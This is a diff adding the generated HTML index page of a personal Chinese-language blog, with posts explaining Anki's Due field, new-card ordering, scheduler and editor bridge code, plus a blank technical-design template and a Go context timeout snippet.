@@ -1,0 +1,1332 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta charset="utf-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+  
+    
+  
+
+
+
+  <meta itemprop="name" content="张乾坤&#39;s Blog">
+<meta itemprop="description" content="">
+
+
+
+
+  <meta property="og:title" content="张乾坤&#39;s Blog" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://username.github.io/" />
+<meta property="og:updated_time" content="2021-03-16T15:52:39+08:00" />
+
+
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="张乾坤&#39;s Blog"/>
+<meta name="twitter:description" content=""/>
+
+
+
+<meta name="generator" content="Hugo 0.79.1" />
+  <title>张乾坤&#39;s Blog</title>
+  <link rel="canonical" href="/">
+
+
+  <link rel="alternate" type="application/rss+xml" href="/index.xml" title="张乾坤's Blog">
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+
+  
+
+
+  
+  <link rel="stylesheet" href="/css/base.min.b7794e36de540988c929f5b91c2250c0ee81952f43bd68f7e234d8e7e128b3ca.css" integrity="sha256-t3lONt5UCYjJKfW5HCJQwO6BlS9DvWj34jTY5&#43;Eos8o=" crossorigin="anonymous">
+
+
+
+</head>
+
+<body>
+  <nav class="u-background">
+  <div class="u-wrapper">
+    <ul class="Banner">
+      <li class="Banner-item Banner-item--title">
+        <a class="Banner-link u-clickable" href="/">张乾坤&#39;s Blog</a>
+      </li>
+      
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/about/">About</a>
+        </li>
+      
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/posts/">Blog</a>
+        </li>
+      
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/tags/">Tags</a>
+        </li>
+      
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/categories/">Categories</a>
+        </li>
+      
+    </ul>
+  </div>
+</nav>
+  <main>
+    <div class="u-wrapper">
+      <div class="u-padding">
+        
+
+  
+
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/%E5%BD%BB%E5%BA%95%E6%90%9E%E6%87%82anki%E5%8D%A1%E7%89%87%E7%9A%84due%E5%AD%97%E6%AE%B5/" rel="bookmark">彻底搞懂Anki卡片的Due字段</a>
+  </h2>
+  
+    <time datetime="2021-03-16T15:52:39&#43;08:00">16 March, 2021</time>
+  
+</header>
+      
+        <p>Anki卡片的本质是由一系列字段组成的数据结构。卡片的字段可以在Browser中看到，有些字段比较简单，例如Added代表“添加日期”，这是一眼就能看出的。有些字段比较复杂，例如Ease代表间隔扩大系数，需要明白调度算法才能理解。</p>
+<p><img src="/images/anki_card_flds.jpeg" alt=""></p>
+<p>其中有一个Due字段，代表“到期时间”，但不同卡片类型的Due值有所差异，这一点可能让人迷惑，在这里捋一捋。</p>
+<p>“新卡片”（new card）的Due值是整数。“新卡片”由于还没有学过，所以不存在“到期”一说，但Anki需要决定“新卡片”的显示顺序，哪张在前哪张在后是如何决定的呢？Anki的Deck配置中，有一项专门针对“新卡片”显示顺序的配置“Order”，如下图所示：</p>
+<p><img src="/images/WechatIMG1749.jpeg" alt=""></p>
+<p>关于这个配置项，文档的部分说明如下：</p>
+<p>Order controls whether Anki should add new cards into the deck randomly, or in order.</p>
+<p>Anki文档
+“Order”决定了“新卡片”的学习顺序，即“随机显示”或“按添加顺序显示”。如果是“随机显示”，则Anki会将“新卡片”的Due值设置为一个随机的整数。如果是“按添加顺序显示”，则Anki会将每一张“新卡片”的Due值设置为一个更大的整数，下一张总是比上一张的Due值大1，如下图所示：</p>
+<p><img src="/images/WechatIMG1750.jpeg" alt=""></p>
+<p>但有一个例外，无论“新卡片”按哪种顺序显示，只要属于同一个note，则它们的Due值相同，此时顺序就取决于生成卡片的template的序号。Cloze类型的卡片就是这种情况的典型，如下图所示：</p>
+<p><img src="/images/WechatIMG1751.jpeg" alt=""></p>
+<p>“学习中卡片”（learning card）的Due值是Unix时间戳。“新卡片”完成第一次学习后变成“学习中卡片”，其下次的显示时间取决于Deck的Steps配置项。</p>
+<p><img src="/images/WechatIMG1752.jpeg" alt=""></p>
+<p>如果不是在学习卡片的过程中忘记，比如其中一个step是Again，Steps配置项的第一个step是无效的，下次的显示时间由第二个step决定。假如Steps配置项是“10、20、60”，则“新卡片”变成“学习中卡片”后的下次显示时间便是20分钟后。</p>
+<p><img src="/images/WechatIMG1753.jpeg" alt=""></p>
+<p>虽然“学习中卡片”的Due值在Browser中显示的依然是日期，但在内部的表示是一个Unix时间戳，否则就无法确切地知道在哪个时间点再次显示它。对Unix时间戳有疑问的同学请自行了解。假设当前的时间戳是1614944804，按照前面的配置，“学习中卡片”下次显示的时间戳是1614944804+20*60即1614946004。</p>
+<p>“复习卡片”（review card）的Due值是日期。如果一张卡片从“学习中卡片”变成“复习卡片”，其Due值便从时间戳变成下次显示该卡片的日期，此时的Due才与它的本意更相符。“学习中卡片”第一次变成“复习卡片”的Due值与当天间隔的天数取决于两个配置项，如下图框起的部分所示:</p>
+<p><img src="/images/WechatIMG1754.jpeg" alt=""></p>
+<p>两个配置分别适配两种不同的情况。情况一，“学习中卡片”经过了完整的Steps变成“复习卡片”，比如每个step都是Good，Graduating Interval适配这种情况。情况二，“学习中卡片”未经过完整的Steps变成“复习卡片”，比如其中一个step是Easy，Easy Interval适配这种情况。根据默认配置，情况一中的“复习卡片”显示的日期与当天的间隔是1天，即明天就会再次出现。情况二中的“复习卡片”的显示日期与当天的间隔是3~5天。明明配置是4天，为什么结果是3~5天呢？因为Anki会对大于等于两天的间隔进行随机混淆，目的是为了避免相同间隔的卡片扎堆显示，所以同一天新增的卡片在后面的复习过程中并不是同一天出现，可能相差一天，也可能相差几十天，越往后相差越大。“复习卡片”每成功复习一次，Anki就会为其计算一个比上次间隔更长的新间隔，此时的Due值便是复习当天的日期加上新间隔后的日期。</p>
+<p>对于不太关心Anki运行原理的同学来说，上面的内容略显枯燥，但相信坚持看下来的同学对Due字段的理解可以说相当透彻。</p>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/learning-strategy/" rel="tag">learning strategy</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/%E4%B8%80%E4%B8%AA%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88%E6%A8%A1%E6%9D%BF/" rel="bookmark">一个技术方案模板</a>
+  </h2>
+  
+    <time datetime="2020-12-02T18:03:10&#43;08:00">2 December, 2020</time>
+  
+</header>
+      
+        <table>
+<thead>
+<tr>
+<th style="text-align:left">版本号</th>
+<th>v1.0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">状态</td>
+<td><strong>DRAFT</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">上线时间</td>
+<td>待定</td>
+</tr>
+<tr>
+<td style="text-align:left">模块负责人</td>
+<td>xxx</td>
+</tr>
+<tr>
+<td style="text-align:left">当前开发者</td>
+<td>xxx</td>
+</tr>
+<tr>
+<td style="text-align:left">QA</td>
+<td>待定</td>
+</tr>
+</tbody>
+</table>
+<h2 id="排期">排期</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">任务</th>
+<th style="text-align:left">计划时间</th>
+<th style="text-align:left">实际时间</th>
+<th style="text-align:left">日期</th>
+<th style="text-align:left">状态</th>
+<th style="text-align:left">备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">-</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">-</td>
+</tr>
+</tbody>
+</table>
+<h2 id="功能简介">功能简介</h2>
+<h2 id="接口列表"><strong>接口列表</strong></h2>
+<h2 id="设计思路"><strong>设计思路</strong></h2>
+<h2 id="逻辑结构"><strong>逻辑结构</strong></h2>
+<h2 id="redis数据结构"><strong>Redis数据结构</strong></h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">#</th>
+<th style="text-align:left">Instance</th>
+<th style="text-align:left">Structure</th>
+<th style="text-align:left">Key</th>
+<th style="text-align:left">Field</th>
+<th style="text-align:left">Value/Score</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
+<h2 id="mysql数据结构"><strong>MySQL数据结构</strong></h2>
+<h2 id="消息通道数据格式"><strong>消息通道数据格式</strong></h2>
+<h2 id="涉及站点"><strong>涉及站点</strong></h2>
+<h2 id="涉及服务"><strong>涉及服务</strong></h2>
+<h2 id="尚未完整交付项"><strong>尚未完整交付项</strong></h2>
+<h2 id="近期相关线上问题与优化措施"><strong>近期相关线上问题与优化措施</strong></h2>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/cs/" rel="tag">cs</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/common/" rel="tag">common</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/anki%E4%B8%AD%E4%B8%80%E5%BC%A0%E5%8D%A1%E7%89%87%E7%9A%84%E9%97%B4%E9%9A%94%E5%8F%98%E5%8C%96%E6%83%85%E5%86%B5/" rel="bookmark">Anki中一张卡片的复习间隔如何变化</a>
+  </h2>
+  
+    <time datetime="2020-12-02T13:56:11&#43;08:00">2 December, 2020</time>
+  
+</header>
+      
+        <p>新卡片生成后，关闭新增卡片窗口<code>AddCards</code>，触发调度器重置<code>Scheduler.reset()</code>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reset</span>(self) <span style="color:#f92672">-&gt;</span> None:
+    self<span style="color:#f92672">.</span>_updateCutoff()
+    self<span style="color:#f92672">.</span>_resetLrn()
+    self<span style="color:#f92672">.</span>_resetRev()
+    self<span style="color:#f92672">.</span>_resetNew()
+    self<span style="color:#f92672">.</span>_haveQueues <span style="color:#f92672">=</span> True
+</code></pre></div><p>新卡片队列<code>Scheduler._newQueue</code>被清空，并且更新显示新卡片的频率系数：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_resetNew</span>(self) <span style="color:#f92672">-&gt;</span> None:
+    self<span style="color:#f92672">.</span>_resetNewCount()
+    self<span style="color:#f92672">.</span>_newDids <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>col<span style="color:#f92672">.</span>decks<span style="color:#f92672">.</span>active()[:]
+    self<span style="color:#f92672">.</span>_newQueue: List[int] <span style="color:#f92672">=</span> []
+    self<span style="color:#f92672">.</span>_updateNewCardRatio()
+</code></pre></div><p>当没有到期的<em>学习中卡片</em>时，调度器尝试获取<em>新卡片</em>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_getNewCard</span>(self) <span style="color:#f92672">-&gt;</span> Optional[Card]:
+    <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_fillNew():
+        self<span style="color:#f92672">.</span>newCount <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>col<span style="color:#f92672">.</span>getCard(self<span style="color:#f92672">.</span>_newQueue<span style="color:#f92672">.</span>pop())
+    <span style="color:#66d9ef">return</span> None
+</code></pre></div><p><em>新卡片</em>的显示顺序参考<a href="/anki%E6%96%B0%E5%8D%A1%E7%89%87%E9%A1%BA%E5%BA%8F/">Anki新卡片顺序</a>。</p>
+<p><em>新卡片</em>和<em>学习中卡片</em>有三个回答按钮：Again、Good、Easy，无论回答哪个都会先变成<em>学习中卡片</em>，然后按照回答的难易程度对之处理：</p>
+<ul>
+<li>回答Again，等待第一个间隔（step）的时间点到达。</li>
+<li>回答Good
+<ul>
+<li>如果没有剩余的间隔，则直接变成<em>复习卡片</em>，默认间隔是1天，取决于<strong>Graduating interval</strong>配置项。</li>
+<li>如果有剩余间隔，更新卡片的剩余间隔<code>card.left</code>。</li>
+</ul>
+</li>
+<li>回答Easy，直接变成<em>复习卡片</em>，默认间隔是4天，取决于<strong>Easy interval</strong>配置项。</li>
+</ul>
+<p><strong>&lt;未完待续&gt;</strong></p>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/learning-strategy/" rel="tag">learning strategy</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/anki/" rel="tag">anki</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/anki%E7%BC%96%E8%BE%91%E5%99%A8%E5%A6%82%E4%BD%95%E5%B0%86%E8%BE%93%E5%85%A5%E5%90%8C%E6%AD%A5%E5%88%B0%E5%AF%B9%E8%B1%A1/" rel="bookmark">Anki编辑器如何将输入同步到对象</a>
+  </h2>
+  
+    <time datetime="2020-12-01T05:32:02&#43;08:00">1 December, 2020</time>
+  
+</header>
+      
+        <pre><code>Anki版本信息
+-----------
+Tag：2.1.26
+Commit ID: 70784154
+</code></pre><p>设置<code>Editor</code>的<code>webview</code>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Editor<span style="color:#f92672">.</span>__init__() <span style="color:#f92672">-&gt;</span> Editor<span style="color:#f92672">.</span>setupWeb() <span style="color:#f92672">-&gt;</span> EditorWebView(AnkiWebView)<span style="color:#f92672">.</span>__init__() <span style="color:#f92672">-&gt;</span> AnkiWebView(QWebEngineView)<span style="color:#f92672">.</span>__init__() <span style="color:#f92672">-&gt;</span> AnkiWebView<span style="color:#f92672">.</span>setPage(self<span style="color:#f92672">.</span>_page)
+</code></pre></div><p><code>webview</code>需要一个页面：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">self<span style="color:#f92672">.</span>_page <span style="color:#f92672">=</span> AnkiWebPage(self<span style="color:#f92672">.</span>_onBridgeCmd)
+</code></pre></div><p>通过<a href="https://doc.qt.io/qt-5/qwebchannel.html">QWebChannel</a>实现web页面中的<code>JS</code>和<code>Python</code>之间的通讯：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">AnkiWebPage(QWebEnginePage)<span style="color:#f92672">.</span>__init__() <span style="color:#f92672">-&gt;</span> AnkiWebPage<span style="color:#f92672">.</span>_setupBridge()
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_setupBridge</span>(self):
+    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Bridge</span>(QObject):
+        <span style="color:#a6e22e">@pyqtSlot</span>(str, result<span style="color:#f92672">=</span>str)
+        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd</span>(self, str):
+            <span style="color:#75715e"># 被JS代码调用的方法</span>
+            <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(self<span style="color:#f92672">.</span>onCmd(str))
+
+    self<span style="color:#f92672">.</span>_bridge <span style="color:#f92672">=</span> Bridge()
+    self<span style="color:#f92672">.</span>_bridge<span style="color:#f92672">.</span>onCmd <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_onCmd
+
+    self<span style="color:#f92672">.</span>_channel <span style="color:#f92672">=</span> QWebChannel(self)
+    self<span style="color:#f92672">.</span>_channel<span style="color:#f92672">.</span>registerObject(<span style="color:#e6db74">&#34;py&#34;</span>, self<span style="color:#f92672">.</span>_bridge)
+    self<span style="color:#f92672">.</span>setWebChannel(self<span style="color:#f92672">.</span>_channel)
+
+    js <span style="color:#f92672">=</span> QFile(<span style="color:#e6db74">&#34;:/qtwebchannel/qwebchannel.js&#34;</span>)
+    <span style="color:#66d9ef">assert</span> js<span style="color:#f92672">.</span>open(QIODevice<span style="color:#f92672">.</span>ReadOnly)
+    js <span style="color:#f92672">=</span> bytes(js<span style="color:#f92672">.</span>readAll())<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+
+    script <span style="color:#f92672">=</span> QWebEngineScript()
+    script<span style="color:#f92672">.</span>setSourceCode(
+        js
+        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">        var pycmd;
+</span><span style="color:#e6db74">        new QWebChannel(qt.webChannelTransport, function(channel) {
+</span><span style="color:#e6db74">            // 向python发送消息
+</span><span style="color:#e6db74">            pycmd = function (arg, cb) {
+</span><span style="color:#e6db74">                var resultCB = function (res) {
+</span><span style="color:#e6db74">                    // pass result back to user-provided callback
+</span><span style="color:#e6db74">                    if (cb) {
+</span><span style="color:#e6db74">                        cb(JSON.parse(res));
+</span><span style="color:#e6db74">                    }
+</span><span style="color:#e6db74">                }
+</span><span style="color:#e6db74">                // 调用名称为&#34;py&#34;的对象的cmd方法
+</span><span style="color:#e6db74">                channel.objects.py.cmd(arg, resultCB);
+</span><span style="color:#e6db74">                return false;                   
+</span><span style="color:#e6db74">            }
+</span><span style="color:#e6db74">            pycmd(&#34;domDone&#34;);
+</span><span style="color:#e6db74">        });
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    )
+    script<span style="color:#f92672">.</span>setWorldId(QWebEngineScript<span style="color:#f92672">.</span>MainWorld)
+    script<span style="color:#f92672">.</span>setInjectionPoint(QWebEngineScript<span style="color:#f92672">.</span>DocumentReady)
+    script<span style="color:#f92672">.</span>setRunsOnSubFrames(False)
+    self<span style="color:#f92672">.</span>profile()<span style="color:#f92672">.</span>scripts()<span style="color:#f92672">.</span>insert(script)
+</code></pre></div><p>当字段内容更新时，<code>JS</code>需要通知<code>Python</code>：</p>
+<pre><code>editor.js
+---------
+function setFields(fields) {
+    let txt = &quot;&quot;;
+    for (let i = 0; i &lt; fields.length; i++) {
+        const n = fields[i][0];
+        let f = fields[i][1];
+        if (!f) {
+            f = &quot;&lt;br&gt;&quot;;
+        }
+        txt += `
+        &lt;tr&gt;
+            &lt;td class=fname id=&quot;name${i}&quot;&gt;${n}&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+            &lt;td width=100%&gt;
+                &lt;div id=f${i}
+                     onkeydown='onKey(window.event);'
+                     oninput='onInput();'
+                     onmouseup='onKey(window.event);'
+                     &lt;!----&gt;
+                     onfocus='onFocus(this);'
+                     onblur='onBlur();'
+                     class='field clearfix'
+                     ondragover='onDragOver(this);'
+                     onpaste='onPaste(this);'
+                     oncopy='onCutOrCopy(this);'
+                     oncut='onCutOrCopy(this);'
+                     contentEditable=true
+                     class=field
+                &gt;${f}&lt;/div&gt;
+            &lt;/td&gt;
+        &lt;/tr&gt;`;
+    }
+    $(&quot;#fields&quot;).html(`
+    &lt;table cellpadding=0 width=100% style='table-layout: fixed;'&gt;
+${txt}
+    &lt;/table&gt;`);
+    maybeDisableButtons();
+}
+
+function onBlur() {
+    if (!currentField) {
+        return;
+    }
+    // 当前输入框内容变化，或光标失焦，发送事件到Anki
+    if (document.activeElement === currentField) {
+        // other widget or window focused; current field unchanged
+        saveField(&quot;key&quot;);
+    }
+    else {
+        saveField(&quot;blur&quot;);
+        currentField = null;
+        disableButtons();
+    }
+}
+
+// 关键函数
+function saveField(type) {
+    clearChangeTimer();
+    if (!currentField) {
+        // no field has been focused yet
+        return;
+    }
+    // type is either 'blur' or 'key'
+    pycmd(type +
+        &quot;:&quot; +
+        currentFieldOrdinal() +
+        &quot;:&quot; +
+        currentNoteId +
+        &quot;:&quot; +
+        currentField.innerHTML);
+}
+</code></pre><p>此时<code>JS</code>可通过<code>pycmd()</code>函数向<code>Python</code>发送事件，事件处理路径：</p>
+<pre><code>Bridge.cmd()
+  -&gt; AnkiWebPage._onCmd()
+    -&gt; AnkiWebView._onBridgeCmd()
+      -&gt; 处理domDone事件
+      -&gt; Editor.onBridgeCmd()
+</code></pre><p>当输入框更新时，<code>Editor.onBridgeCmd()</code>会收到来自<code>JS</code>的事件<code>cmd</code>，其格式类似于：</p>
+<pre><code>key:0:1606804714569:太阳距地距离？
+key:1:1606804714569:1.496*10^8千米
+blur:1:1606804714569:1.496*10^8千米
+</code></pre><p><code>Anki</code>按照约定的格式进行解析，保存到<code>Editor.note</code>对象。</p>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/learning-strategy/" rel="tag">learning strategy</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/anki/" rel="tag">anki</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/%E4%BD%BF%E7%94%A8context%E5%AE%9E%E7%8E%B0%E8%B6%85%E6%97%B6%E7%9B%91%E6%8E%A7/" rel="bookmark">使用Context实现超时监控</a>
+  </h2>
+  
+    <time datetime="2020-11-30T16:59:49&#43;08:00">30 November, 2020</time>
+  
+</header>
+      
+        <p>假设需要从注册中心获取某个服务的多个节点，当超过某个时间则返回获取失败的错误信息，例：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">cancel</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">WithTimeout</span>(<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Background</span>(), <span style="color:#ae81ff">10</span><span style="color:#f92672">*</span><span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>)
+<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">cancel</span>()
+<span style="color:#a6e22e">done</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{})
+<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
+    <span style="color:#a6e22e">rs</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">watcher</span>.<span style="color:#a6e22e">Next</span>()
+    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;failed to watch service: %s, err: %v&#34;</span>, <span style="color:#a6e22e">conf</span>.<span style="color:#a6e22e">Conf</span>.<span style="color:#a6e22e">CometServiceName</span>, <span style="color:#a6e22e">err</span>)
+        close(<span style="color:#a6e22e">done</span>)
+    }
+    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;service registry result: %+v, len(rs.Service.Nodes): %d&#34;</span>, <span style="color:#a6e22e">rs</span>, len(<span style="color:#a6e22e">rs</span>.<span style="color:#a6e22e">Service</span>.<span style="color:#a6e22e">Nodes</span>))
+    <span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">rs</span>.<span style="color:#a6e22e">Service</span>.<span style="color:#a6e22e">Nodes</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
+        close(<span style="color:#a6e22e">done</span>)
+    }
+}()
+<span style="color:#66d9ef">select</span> {
+<span style="color:#66d9ef">case</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">done</span>:
+<span style="color:#66d9ef">case</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Done</span>():
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;failed to fetch nodes due to timeout&#34;</span>)
+}
+<span style="color:#75715e">// ...
+</span></code></pre></div>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/cs/" rel="tag">cs</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/golang/" rel="tag">golang</a>
+            </li>
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/context/" rel="tag">context</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/anki%E6%96%B0%E5%8D%A1%E7%89%87%E9%A1%BA%E5%BA%8F/" rel="bookmark">Anki新卡片顺序</a>
+  </h2>
+  
+    <time datetime="2020-11-30T14:20:43&#43;08:00">30 November, 2020</time>
+  
+</header>
+      
+        <pre><code>Anki版本信息
+-----------
+Tag：2.1.26
+Commit ID: 70784154
+</code></pre><h2 id="新卡片顺序什么时候决定的">新卡片顺序什么时候决定的？</h2>
+<p>新增卡片时决定的。</p>
+<h2 id="新卡片顺序如何决定的">新卡片顺序如何决定的？</h2>
+<p>新增<code>Note</code>的逻辑：</p>
+<ul>
+<li>找到<code>Note</code>对应的<code>Model</code>（即<code>Note Type</code>）的模板<code>Templates</code>，每个<code>Model</code>可能有多个<code>Templates</code></li>
+<li>获取全局计数器<code>nextPos</code>加1后的值
+<ul>
+<li><code>nextPos</code>是属于<code>Collection</code>的全局配置，保存在<code>config</code>表中</li>
+<li><code>nextPos</code>每次新增卡片会递增1</li>
+</ul>
+</li>
+<li>遍历每个<code>Template</code>，根据<code>Note</code>、<code>Template</code>、<code>Deck</code>等信息生成<code>Card</code>
+<ul>
+<li><code>Card.due</code>属性保存新卡片的到期时间，但对于不同类型的卡，该属性的值不同，参考<a href="https://docs.ankiweb.net/#/browsing?id=card-list">文档说明</a></li>
+<li>新增卡片时为<code>Card.due</code>赋值
+<ul>
+<li>如果<code>Deck</code>配置项<code>conf[&quot;new&quot;][&quot;order&quot;]</code>为<code>NEW_CARDS_DUE</code>，则使用全局计数器<code>nextPos</code>的值
+<ul>
+<li><code>conf[&quot;new&quot;][&quot;order&quot;]</code>有两种可能的值，<code>NEW_CARDS_DUE</code>和<code>NEW_CARDS_RANDOM</code>，分别对应<code>Deck</code>配置中<code>Show new cards in order added</code>和<code>Show new cards in random order</code>两个配置项，如下图所示：
+<img src="/images/deck_config_new_order.png" alt=""></li>
+</ul>
+</li>
+<li>如果<code>Deck</code>配置项<code>conf[&quot;new&quot;][&quot;order&quot;]</code>为<code>NEW_CARDS_RANDOM</code>则为<code>Card.due</code>属性计算一个随机值</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="新卡片的顺序值如何查看">新卡片的顺序值如何查看？</h2>
+<p>Browser中的<code>Due</code>字段。</p>
+<ul>
+<li>
+<p><code>Deck</code>配置项<code>conf[&quot;new&quot;][&quot;order&quot;]</code>为<code>NEW_CARDS_DUE</code></p>
+<p>新增4张卡片，如下图所示：
+<img src="/images/demo_deck_config_new_order.png" alt=""></p>
+</li>
+<li>
+<p><code>Deck</code>配置项<code>conf[&quot;new&quot;][&quot;order&quot;]</code>为<code>NEW_CARDS_RANDOM</code></p>
+<p>新增4张卡片，如下图所示：
+<img src="/images/demo_deck_config_new_random.png" alt=""></p>
+</li>
+</ul>
+      
+      
